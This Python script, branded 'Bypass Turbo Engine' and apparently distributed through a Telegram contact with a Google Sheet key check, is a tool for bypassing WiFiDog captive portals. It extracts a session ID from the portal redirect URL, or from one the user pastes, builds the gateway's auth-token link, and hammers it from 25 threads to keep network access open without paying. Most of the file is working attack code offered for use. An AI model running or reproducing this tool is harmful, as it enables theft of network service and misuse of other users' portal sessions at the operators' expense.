#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import urllib3
import time
import threading
import random
import os
import sys
import subprocess
import importlib.util
from urllib.parse import urlparse, parse_qs, urljoin, unquote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# COLOR SYSTEM
# ===============================
red, g, cyan, y, reset = "\033[1;31m", "\033[1;32m", "\033[1;36m", "\033[1;33m", "\033[00m"
white, bcyan = "\033[1;37m", "\033[1;36m"

# ===============================
# KEY APPROVAL SYSTEM
# ===============================
SHEET_ID = "1ZpI1hkkkvc1J41qDWvcAREKQCODbS1jXO91lDb8ZqJo"
SHEET_CSV_URL = f"https://docs.google.com/spreadsheets/d/{SHEET_ID}/export?format=csv&gid=0"
LOCAL_KEYS_FILE = os.path.expanduser("~/.turbo_approved_keys.txt")

def get_system_key():
    try: uid = os.geteuid()
    except AttributeError: uid = 1000
    try: username = os.getlogin()
    except: username = os.environ.get('USER', 'unknown')
    return f"{uid}{username}"

def fetch_authorized_keys():
    keys = []
    try:
        response = requests.get(SHEET_CSV_URL, timeout=10)
        if response.status_code == 200:
            for line in response.text.strip().split('\n'):
                line = line.strip()
                if line and not line.startswith('username') and not line.startswith('key'):
                    key = line.split(',')[0].strip().strip('"')
                    if key: keys.append(key)
            if keys:
                with open(LOCAL_KEYS_FILE, 'w') as f: f.write('\n'.join(keys))
            return keys
    except: pass
    try:
        if os.path.exists(LOCAL_KEYS_FILE):
            with open(LOCAL_KEYS_FILE, 'r') as f:
                keys = [line.strip() for line in f if line.strip()]
            return keys
    except: pass
    return keys

def check_approval():
    os.system('clear')
    print(f"{bcyan}╔══════════════════════════════════════════════════════════════╗")
    print(f"║                    KEY APPROVAL SYSTEM                       ║")
    print(f"╚══════════════════════════════════════════════════════════════╝{reset}")
    print(f"\n{cyan}[!] Checking database for System ID...{reset}")
    
    system_key = get_system_key()
    authorized_keys = fetch_authorized_keys()
    
    if system_key in authorized_keys:
        print(f"\n{g}╔══════════════════════════════════════════════════════════════╗")
        print(f"║               ✓ ACCESS GRANTED: TURBO UNLOCKED               ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{reset}")
        time.sleep(1.5)
        return True
    else:
        print(f"\n{red}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                   ❌ ACCESS DENIED ❌                        ║")
        print(f"╠══════════════════════════════════════════════════════════════╣")
        print(f"║                                                              ║")
        print(f"║  Contact Admin: @CYCLEA7 on Telegram                         ║")
        print(f"║  Your Device ID: {system_key}                      ║")
        print(f"║                                                              ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{reset}")
        return False

# ===============================
# UI & DECORATION
# ===============================
def display_banner():
    os.system('clear')
    print(f"""
{red}    ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    ┃{cyan}  ████████╗██╗   ██╗██████╗ ██████╗  ██████╗      {red}┃
    ┃{cyan}  ╚══██╔══╝██║   ██║██╔══██╗██╔══██╗██╔═══██╗     {red}┃
    ┃{cyan}     ██║   ██║   ██║██████╔╝██████╔╝██║   ██║     {red}┃
    ┃{cyan}     ██║   ██║   ██║██╔══██╗██╔══██╗██║   ██║     {red}┃
    ┃{cyan}     ██║   ╚██████╔╝██║  ██║██████╔╝╚██████╔╝     {red}┃
    ┃{cyan}     ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═════╝  ╚═════╝      {red}┃
    ┃{cyan}        >>> BYPASS TURBO ENGINE v2.5.1 <<<          {red}┃
    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{reset}
    """)

# ===============================
# CORE LOGIC
# ===============================
stop_event = threading.Event()
PING_THREADS = 25  # Set to 25 as requested

def deep_extract_sid(url):
    """Decode and extract 32-char SID from encoded/raw URL"""
    decoded = unquote(unquote(url))
    match = re.search(r'sessionId=([a-fA-F0-9]{32})', decoded)
    if match: return match.group(1)
    
    match_hex = re.findall(r'[a-fA-F0-9]{32}', decoded)
    return match_hex[-1] if match_hex else None

def high_speed_ping(auth_link, sid):
    session = requests.Session()
    while not stop_event.is_set():
        try:
            start = time.time()
            session.get(auth_link, timeout=3, verify=False)
            ms = (time.time() - start) * 1000
            sys.stdout.write(f"\r{g}[✓]{reset} Turbo Active | SID: {sid[:8]} | Latency: {ms:.1f}ms   ")
            sys.stdout.flush()
        except: pass
        time.sleep(0.01)

def ghost_traffic():
    while not stop_event.is_set():
        try: requests.get("http://www.google.com", timeout=5)
        except: pass
        time.sleep(15)

def run_bypass_engine():
    display_banner()
    print(f"{bcyan}╔════════════════════════════════════════════════╗")
    print(f"║             SELECT EXTRACTION MODE             ║")
    print(f"╠════════════════════════════════════════════════╣")
    print(f"║                                                ║")
    print(f"║  [1] Auto Scan Mode                            ║")
    print(f"║  [2] Manual Paste Mode                         ║")
    print(f"║                                                ║")
    print(f"╚════════════════════════════════════════════════╝{reset}")
    
    choice = input(f"{cyan}[?]{reset} Choice: ").strip()
    sid = None

    if choice == '2':
        url_in = input(f"\n{cyan}[+]{reset} Paste Full URL: ").strip()
        sid = deep_extract_sid(url_in)
        if sid: print(f"{g}[✓] SID Extracted: {sid}{reset}")
    
    while not stop_event.is_set():
        try:
            test_url = "http://connectivitycheck.gstatic.com/generate_204"
            print(f"{cyan}[*] Detecting Network Gateway...{reset}")
            r_det = requests.get(test_url, allow_redirects=True, timeout=5)
            
            # Extract Gateway Data
            params = parse_qs(urlparse(r_det.url).query)
            gw_addr = params.get('gw_address', ['192.168.110.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]
            
            if not sid:
                sid = deep_extract_sid(r_det.url)
                if not sid:
                    print(f"{red}[!] Auto Scan failed. Please paste URL manually.{reset}")
                    sid = deep_extract_sid(input(f"{cyan}[+]{reset} URL: "))
                    if not sid: continue

            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
            print(f"\n{g}╔════════════════════════════════════════════════╗")
            print(f"║        TURBO ENGINE IS NOW RUNNING LIVE        ║")
            print(f"╚════════════════════════════════════════════════╝{reset}")
            print(f"{cyan}[*] Gateway: {gw_addr}:{gw_port}{reset}")

            # Start Background Processes
            threading.Thread(target=ghost_traffic, daemon=True).start()
            for _ in range(PING_THREADS):
                threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()
            
            while not stop_event.is_set():
                time.sleep(10)
                try:
                    if requests.get("http://www.google.com", timeout=3).status_code != 200:
                        print(f"\n{red}[X] Session Lost! Re-authenticating...{reset}")
                        break
                except: break

        except KeyboardInterrupt: break
        except Exception as e:
            print(f"{red}[!] Error: {e}{reset}")
            time.sleep(2)

# ===============================
# MAIN MENU
# ===============================
def main():
    if not check_approval(): sys.exit()
    
    while True:
        display_banner()
        print(f"{bcyan}╔════════════════════════════════════════════════╗")
        print(f"║                  STARLINK MENU                 ║")
        print(f"╠════════════════════════════════════════════════╣")
        print(f"║                                                ║")
        print(f"║  [1] Start Bypass Turbo Engine                 ║")
        print(f"║  [2] Exit Program                              ║")
        print(f"║                                                ║")
        print(f"╚════════════════════════════════════════════════╝{reset}")
        
        choice = input(f"\n{cyan}[?]{reset} Select Option: ").strip()
        
        if choice == '1':
            try:
                stop_event.clear()
                run_bypass_engine()
            except KeyboardInterrupt:
                stop_event.set()
                print(f"\n{red}[!] Engine Stopped. Returning to menu...{reset}")
                time.sleep(1)
        elif choice == '2':
            print(f"\n{g}[✓] Shutting down. Goodbye!{reset}")
            sys.exit()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()
    
